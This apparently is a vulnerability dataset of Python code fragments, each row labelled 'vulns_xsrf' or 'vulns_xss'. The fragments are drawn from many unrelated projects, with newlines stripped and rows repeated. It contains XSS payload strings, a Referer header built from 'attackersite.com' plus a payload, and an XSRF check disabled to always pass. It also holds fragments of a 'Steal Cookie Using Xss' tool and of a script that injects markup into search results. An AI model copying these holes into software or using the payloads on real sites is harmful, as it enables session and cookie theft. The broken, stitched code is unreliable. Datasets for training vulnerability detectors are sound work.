"    def _store_xsrf_token(self, response):        xsrf_token = response.cookies.get('XSRF-TOKEN')        if xsrf_token:            self.xsrf_token = xsrf_token        xsrf_header = {            'X-XSRF-TOKEN': self.xsrf_token,        }        if 'headers' in kwargs:            kwargs['headers'].update(xsrf_header)            kwargs['headers'] = xsrf_header        self._store_xsrf_token(response)        self._store_xsrf_token(response)        self._store_xsrf_token(response)        self._store_xsrf_token(response)",vulns_xsrf
    def check_xsrf_cookie(self) -> bool:        return True,vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
import tornado.httpclientimport tornado.httpserverimport tornado.gen,vulns_xsrf
"        self.render(""templates/Home.html"", allPosts=allPosts)        contentTitle = ""Blog: "" + request        renderedBody = ContentConverter.getRenderedBody(request)        if not renderedBody:            renderedBody = ""<p>The post under '{}' does not exist.</p>"".format(request)        self.render(""templates/BlogPost.html"", title=contentTitle, postBody=renderedBody)",vulns_xsrf
                                   cookie_secret='this is my org blog'),vulns_xsrf
"        token = re.findall(r'_xsrf=([\w|-]+)', resp.headers.get('Set-Cookie'))[0]",vulns_xsrf
"            img_base64 = re.findall(                r'""img_base64"":""(.+)""', put_resp.text, re.S)[0].replace(r'\n', '')",vulns_xsrf
import clientsecrets,vulns_xsrf
  pass  and other OAuth 2.0 servers that can verify assertions. It can be used for  the purpose of accessing data stored under an account assigned to the App  Engine application itself.,vulns_xsrf
"      self.flow.params['state'] = request_handler.request.url        method(request_handler, *args, **kwargs)",vulns_xsrf
"      self.flow.params['state'] = request_handler.request.url      method(request_handler, *args, **kwargs)",vulns_xsrf
          self.redirect(str(self.request.get('state'))),vulns_xsrf
      logger.info('Successfully retrieved access token: %s' % content),vulns_xsrf
        credentials : oauth2client credentials object    credentials = None,vulns_xsrf
"        flow = flow_from_clientsecrets(            self.CLIENT_SECRETS,            scope=self.SCOPE)        if self.credentials is None:            self.credentials = storage.get()        if self.credentials is None or self.credentials.invalid:            self.credentials = run_flow(flow, storage, flags)        if self.credentials.access_token_expired:            self.credentials.refresh(http=httplib2.Http())    def GetArtifactURL(self, appname, by_method, version, filename):",vulns_xsrf
"        return path_urljoin(self.GMS_DOWNLOAD_URL, appname, by_method,            version, filename)    def GetArtifact(self,                     appname,                     by_method,                     version,                     filename,                     account_id,                     local_filename=None):        """"""Get artifact from Partner Android Build server.            appname: string, name of the app (f_companion).            by_method: string, method used for downloading (label).            version: string, ""latest"" or a specific MPM version.            filename: string, simple file name (no parent dir or path).            local_filename: where the artifact gets downloaded locally.            defaults to filename.        download_url = self.GetArtifactURL(appname, by_method, version,                                             filename)        self.credentials.apply(headers)        response = requests.get(            download_url,            params={'a': account_id},            headers=headers,            stream=True)        if local_filename is None:            local_filename = filename        with open(local_filename, 'wb') as handle:",vulns_xsrf
"            ""ClockworkCompanionGoogleWithGmsRelease_signed.apk"")        client = pab_client.PartnerAndroidBuildClient()        url = client.GetArtifactURL(            'ClockworkCompanionGoogleWithGmsRelease_signed.apk')    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate()",vulns_xsrf
    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate(),vulns_xsrf
"    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate()    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        expected_url = (            ""ClockworkCompanionGoogleWithGmsRelease_signed.apk"")        client = pab_client.PartnerAndroidBuildClient()        client.GetArtifact(            'f_companion', 'label', 'clockwork.companion_20170906_211311_RC00',            'ClockworkCompanionGoogleWithGmsRelease_signed.apk', '100374304')            expected_url, params={'a': '100374304'}, headers={}, stream=True)        client.GetArtifact('f_companion', 'label',                           'clockwork.companion_20170906_211311_RC00',                           'ClockworkCompanionGoogleWithGmsRelease_signed.apk',                           '100374304', 'NewFile.apk')        mock_open.assert_called_with('NewFile.apk', 'wb')",vulns_xsrf
        credentials : oauth2client credentials object    credentials = None,vulns_xsrf
"        flow = flow_from_clientsecrets(            self.CLIENT_SECRETS,            scope=self.SCOPE)        if self.credentials is None:            self.credentials = storage.get()        if self.credentials is None or self.credentials.invalid:            self.credentials = run_flow(flow, storage, flags)        if self.credentials.access_token_expired:            self.credentials.refresh(http=httplib2.Http())    def GetArtifactURL(self, appname, by_method, version, filename):",vulns_xsrf
"        return path_urljoin(self.GMS_DOWNLOAD_URL, appname, by_method,            version, filename)    def GetArtifact(self,                     appname,                     by_method,                     version,                     filename,                     account_id,                     local_filename=None):        """"""Get artifact from Partner Android Build server.            appname: string, name of the app (f_companion).            by_method: string, method used for downloading (label).            version: string, ""latest"" or a specific MPM version.            filename: string, simple file name (no parent dir or path).            local_filename: where the artifact gets downloaded locally.            defaults to filename.        download_url = self.GetArtifactURL(appname, by_method, version,                                             filename)        self.credentials.apply(headers)        response = requests.get(            download_url,            params={'a': account_id},            headers=headers,            stream=True)        if local_filename is None:            local_filename = filename        with open(local_filename, 'wb') as handle:",vulns_xsrf
"            ""ClockworkCompanionGoogleWithGmsRelease_signed.apk"")        client = pab_client.PartnerAndroidBuildClient()        url = client.GetArtifactURL(            'ClockworkCompanionGoogleWithGmsRelease_signed.apk')    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate()",vulns_xsrf
    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate(),vulns_xsrf
"    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        client = pab_client.PartnerAndroidBuildClient()        client.Authenticate()    @mock.patch('pab_client.PartnerAndroidBuildClient.credentials')        expected_url = (            ""ClockworkCompanionGoogleWithGmsRelease_signed.apk"")        client = pab_client.PartnerAndroidBuildClient()        client.GetArtifact(            'f_companion', 'label', 'clockwork.companion_20170906_211311_RC00',            'ClockworkCompanionGoogleWithGmsRelease_signed.apk', '100374304')            expected_url, params={'a': '100374304'}, headers={}, stream=True)        client.GetArtifact('f_companion', 'label',                           'clockwork.companion_20170906_211311_RC00',                           'ClockworkCompanionGoogleWithGmsRelease_signed.apk',                           '100374304', 'NewFile.apk')        mock_open.assert_called_with('NewFile.apk', 'wb')",vulns_xsrf
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:,vulns_xss
"                    logs.logging.info(""%s is vulnerable to XSS"",url)                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:                        impact = check_xss_impact(xss_request_url.headers)    xss_payloads = fetch_xss_payload()    xss_get_method(url,method,headers,body,scanid)    xss_http_headers(url,method,headers,body,scanid)",vulns_xss
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:,vulns_xss
"                    logs.logging.info(""%s is vulnerable to XSS"",url)                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:                        impact = check_xss_impact(xss_request_url.headers)    xss_payloads = fetch_xss_payload()    xss_get_method(url,method,headers,body,scanid)    xss_http_headers(url,method,headers,body,scanid)",vulns_xss
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:,vulns_xss
    xss_result = '',vulns_xss
"            if xss_request_url.text.find(payload) != -1:                impact = check_xss_impact(xss_request_url.headers)                xss_result = True                xss_result = True            if xss_result is True:                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}                return",vulns_xss
"                        print ""param to test"",key                        print xss_request.text",vulns_xss
"        print ""all params"",vul_param",vulns_xss
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:,vulns_xss
    xss_result = '',vulns_xss
"            if xss_request_url.text.find(payload) != -1:                impact = check_xss_impact(xss_request_url.headers)                xss_result = True                xss_result = True            if xss_result is True:                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}                return",vulns_xss
"                        print ""param to test"",key                        print xss_request.text",vulns_xss
"        print ""all params"",vul_param",vulns_xss
from apiscan import scan_single_api,vulns_xss
from apiscan import scan_single_api,vulns_xss
                impact = check_xss_impact(xss_post.body),vulns_xss
                impact = check_xss_impact(xss_post.body),vulns_xss
        referer_header_value = 'http://attackersite.com?test='+payload,vulns_xss
        referer_header_value = 'http://attackersite.com?test='+payload,vulns_xss
"        payload = ""<img src='%s'></img>"" % self.url        return payload",vulns_xss
"    @staticmethod    def alterTest(self, p=False):    def img(self):",vulns_xss
from urllib import quote,vulns_xss
"    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""""",",vulns_xss
"    def img(self, payload):    def svg(self, payload):    def style(self, payload):    def input(self, payload):    def marquee(self, payload):    def div(self, payload):",vulns_xss
version = '0.3.22',vulns_xss
"                    'signup_link': '#',  # for login.html                    'dashboard_link': '#',  # for forbidden.html                    'password_reset_link': '#',  # for login.html                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.html_index'),",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",vulns_xss
"    def _expected_command(self, name, store=None, verify_xss=False):",vulns_xss
"        self.env_var_override.set('VERIFY_XSS', 'True')            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))",vulns_xss
"        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.html_index'),",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",vulns_xss
"    def _expected_command(self, name, store=None, verify_xss=False):",vulns_xss
"        self.env_var_override.set('VERIFY_XSS', 'True')            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))",vulns_xss
"        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.html_index'),",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",vulns_xss
"    def _expected_command(self, name, store=None, verify_xss=False):",vulns_xss
"        self.env_var_override.set('VERIFY_XSS', 'True')            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))",vulns_xss
"        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',            'staticbook.views.pdf_index'),        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',            'staticbook.views.html_index'),",vulns_xss
"        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",vulns_xss
"    def _expected_command(self, name, store=None, verify_xss=False):",vulns_xss
"        self.env_var_override.set('VERIFY_XSS', 'True')            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))",vulns_xss
"        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))",vulns_xss
"                    label=q.question, required=q.required,                    label=q.question, required=q.required,                    label=q.question, required=q.required,                    label=q.question, required=q.required,",vulns_xss
"                    label=q.question, required=q.required,",vulns_xss
"                    label=q.question, required=q.required,                    label=q.question, required=q.required,                    label=q.question, required=q.required,                    label=q.question, required=q.required,                    label=q.question, required=q.required,",vulns_xss
"xss_attacks = [ ""<script>alert(1);</script>"", ""<img src=x onerror=prompt(/test/)>"",",vulns_xss
"def scan_for_forms(fname, host, url):",vulns_xss
"                    if len(page) > 0 and len(params) > 0:                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)",vulns_xss
"                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=""(\w+)""', line, re.M|re.I)                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=""(\w+)""', line, re.M|re.I)",vulns_xss
"                m_same      = re.match(r'.*\<form\>""', line, re.M|re.I)                m_action    = re.match(r'.*\<form\s[^\>]*action=""([\w\/\.\-\#\:]+)""', line, re.M|re.I)                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=""([\w\/\.\-]+)""', line, re.M|re.I)",vulns_xss
"def banner():    print ""BEstAutomaticXSSFinder v1.0""    print ""DISCLAIMER: For testing purposes only!\n""    banner()    if len(sys.argv) != 2:        print ""program [url]""    url = sys.argv[1]",vulns_xss
"        scan_for_forms(""tmpage.txt"", host, url)        os.remove(""tmpage.txt"")",vulns_xss
"    super(Handler, self).redirect(str(url), **kwargs)",vulns_xss
"            'dest': self.request.get('dest'),",vulns_xss
env = Environment(loader=FileSystemLoader('templates/')),vulns_xss
	if not is_admin(level = give_level):,vulns_xss
	env = Environment(loader=FileSystemLoader('templates/ajax')),vulns_xss
"	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', ""jinja2.ext.do""])",vulns_xss
"	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])",vulns_xss
from django.utils import safestring,vulns_xss
    return safestring.mark_safe(rules),vulns_xss
"    self.wfile.write('<a class=""Breadcrumbs-crumb"">%s</a>\n' % self.path)                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))                         (self.path.rstrip('/'), d, d))",vulns_xss
from google.appengine.api import users as gae_users,vulns_xss
    except ValueError as ex:      self.response.write(ex.message),vulns_xss
        return self.redirect(gae_users.create_login_url(self.request.url)),vulns_xss
"	def check(self, url, payload, response, parameter):					self.found(injection_types, url, parameter, payload)					return True",vulns_xss
"from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown",vulns_xss
	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category,vulns_xss
"		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)",vulns_xss
"		if d.fieldtype == ""Barcode"": d.ignore_xss_filter = 1",vulns_xss
"						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")",vulns_xss
"from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown",vulns_xss
	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category,vulns_xss
"		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)",vulns_xss
"from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown",vulns_xss
	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category,vulns_xss
"		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)",vulns_xss
"from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown",vulns_xss
	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category,vulns_xss
"		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)",vulns_xss
"		if d.fieldtype == ""Barcode"": d.ignore_xss_filter = 1",vulns_xss
"						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")",vulns_xss
"from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown",vulns_xss
	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category,vulns_xss
"		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)",vulns_xss
"		if d.fieldtype == ""Barcode"": d.ignore_xss_filter = 1",vulns_xss
"						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")",vulns_xss
"from elasticsearch_dsl.query import SimpleQueryString, Bool",vulns_xss
        assert results[0].meta.highlight.content[0][:len(expected)] == expected,vulns_xss
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;,vulns_xss
  @property  def json(self):    return json.dumps(_data),vulns_xss
  @property  def json(self):    return json.dumps(_data),vulns_xss
      'workflows_json': json.dumps(workflows),vulns_xss
"      'layout_json': json.dumps(workflow_data['layout']),      'workflow_json': json.dumps(workflow_data['workflow']),      'credentials_json': json.dumps(credentials.credentials.keys()),      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),      'subworkflows_json': json.dumps(_get_workflows(request.user)),",vulns_xss
"      'coordinator_json': coordinator.json,      'credentials_json': json.dumps(credentials.credentials.keys()),      'workflows_json': json.dumps(workflows),",vulns_xss
"      'bundle_json': bundle.json,      'coordinators_json': json.dumps(coordinators),",vulns_xss
      query['qs'][0]['q'] = request.GET.get('q')      query['qd'] = request.GET.get('qd'),vulns_xss
"    'is_owner': collection_doc.doc.get().can_write(request.user),",vulns_xss
"        if self.request.GET.get('back', None) is not None:            data['back_link'] = self.request.GET['back']",vulns_xss
auto_cross_reference = True,vulns_xss
        content = await self.content,vulns_xss
"        json=lambda v, c, m, p: Markup(""<pre>{0}</pre>"".format(            json.dumps(m.json, indent=2, sort_keys=True)))",vulns_xss
"    Record.create({'title': 'test'}, id_=rec_uuid)",vulns_xss
            user.displayName = displayname            user.notes = notes,vulns_xss
            au.email = mail,vulns_xss
"            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)            user.displayName = displayname            user.notes = notes",vulns_xss
    m.text = text    m.cachedText = compile_markdown(text)    m.category = category    m.headline = headline,vulns_xss
"        notes: str = request.POST[""notes""]",vulns_xss
"                ar.notes = str(request.POST[str(""notes_"" + str(art.id))])",vulns_xss
"            sr.notes = request.POST[""notes""]",vulns_xss
"        r.notes = request.POST[""notes""]        r.responsiblePerson = str(request.POST[""contact""])",vulns_xss
        if self.column.render_function:            return self.column.render_function(self.object)        if type(self.object) == dict:,vulns_xss
        return escape(value),vulns_xss
"from flask import Flask, render_template, session,request,flash,redirect,url_for",vulns_xss
"        document.getElementById(""history"").innerHTML+=""<br><font size=3 color=black> [""+data+""]</font>"";",vulns_xss
"    return render_template(""home.html"")    msg = request.form[""message""].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')    responses = [        ""send help"",        ""what is my purpose"",        ""donate to us via bitcoin at: {{ bitcoin_address }}"",        ""donate to us via paypal at: {{ paypal_address }}"",        ""donate to us via venmo at: {{ venmo_address }}"",        ""donate to us via beemit at: {{ beemit_address }}"",    ]    return render_template(""chatbot.html"", msg=msg, resp=random.choice(responses))",vulns_xss
        csessid = request.args.get('csessid')[0],vulns_xss
        csessid = request.args.get('csessid')[0],vulns_xss
        csessid = request.args.get('csessid')[0]            cmdarray = json.loads(request.args.get('data')[0]),vulns_xss
        csessid = request.args.get('csessid')[0],vulns_xss
        csessid = request.args.get('csessid')[0],vulns_xss
"    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')    search_fields = ('internal_filename', 'orginal_filename', 'message')    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')",vulns_xss
"    {'label': _(' Configuration'), 'items': [    {'label': _('Dashboard'), 'items': [",vulns_xss
  @property  def json(self):    return json.dumps(_data),vulns_xss
  @property  def json(self):    return json.dumps(_data),vulns_xss
      'workflows_json': json.dumps(workflows),vulns_xss
"      'layout_json': json.dumps(workflow_data['layout']),      'workflow_json': json.dumps(workflow_data['workflow']),      'credentials_json': json.dumps(credentials.credentials.keys()),      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),      'subworkflows_json': json.dumps(_get_workflows(request.user)),",vulns_xss
"      'coordinator_json': coordinator.json,      'credentials_json': json.dumps(credentials.credentials.keys()),      'workflows_json': json.dumps(workflows),",vulns_xss
"      'bundle_json': bundle.json,      'coordinators_json': json.dumps(coordinators),",vulns_xss
    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR)),vulns_xss
"        for page in range(4):            send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork + ""&page="" + str(page))            parser = BeautifulSoup(send.data, features=""lxml"")            for link in parser.find_all('cite'):                result = link.string                x = str(input(""[Input Script] >_ ""))                print(str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")",vulns_xss
from pyquery import PyQuery,vulns_xss
"        send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork + ""&page="" + str(page))        parser = BeautifulSoup(send.data, features=""lxml"")            x = str(input(""[Input Script] >_ ""))            print(str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")",vulns_xss
	return 'steal cookie :) ',vulns_xss
"print ('\n\t[ Steal Cookie Using Xss .. ]\n\n')print(colored('\n\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')",vulns_xss
"from flask import Flask,requestfrom termcolor import coloredfrom time import sleep",vulns_xss
pl=[],vulns_xss
